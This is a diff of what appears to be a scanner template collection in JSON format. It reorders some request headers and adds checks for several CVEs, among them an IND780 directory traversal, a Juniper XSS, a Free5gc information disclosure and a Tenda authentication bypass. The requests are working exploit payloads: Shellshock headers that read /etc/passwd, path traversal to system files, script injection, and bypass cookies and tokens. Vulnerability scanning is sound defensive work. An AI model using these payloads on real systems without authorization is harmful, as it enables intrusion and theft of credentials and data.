@@ -3391,9 +3391,9 @@
       "requests": [
         {
           "headers": {
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -17169,8 +17169,8 @@
       "requests": [
         {
           "headers": {
-            "Referer": "{{BaseURL}}/assets/base/home.html",
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html"
           },
           "method": "GET",
           "path": [
@@ -17831,6 +17831,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-40661",
+      "info": {
+        "name": "IND780 - Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/IND780/excalweb.dll?webpage=../../AutoCE.ini"
           ]
         }
       ]
@@ -20224,6 +20239,21 @@
       ]
     },
     {
+      "id": "CVE-2022-22242",
+      "info": {
+        "name": "Juniper Web Device Manager - Cross-Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/error.php?SERVER_NAME=<script>alert(document.domain)</script>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-22536",
       "info": {
         "name": "SAP Memory Pipes (MPI) Desynchronization",
@@ -22417,6 +22447,20 @@
       ]
     },
     {
+      "id": "CVE-2022-38870",
+      "info": {
+        "name": "Free5gc - Information disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /api/subscriber HTTP/1.1\nHost: {{Hostname}}\nToken: admin\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-39960",
       "info": {
         "name": "Atlassian Jira addon Netic Group Export < 1.0.3 - Unauthenticated Access",
@@ -22517,6 +22561,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=../../../../../../../../../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-42233",
+      "info": {
+        "name": "Tenda 11N - Authentication Bypass",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /index.asp HTTP/1.1\nHost: {{Hostname}}\nCookie: admin\n"
           ]
         }
       ]
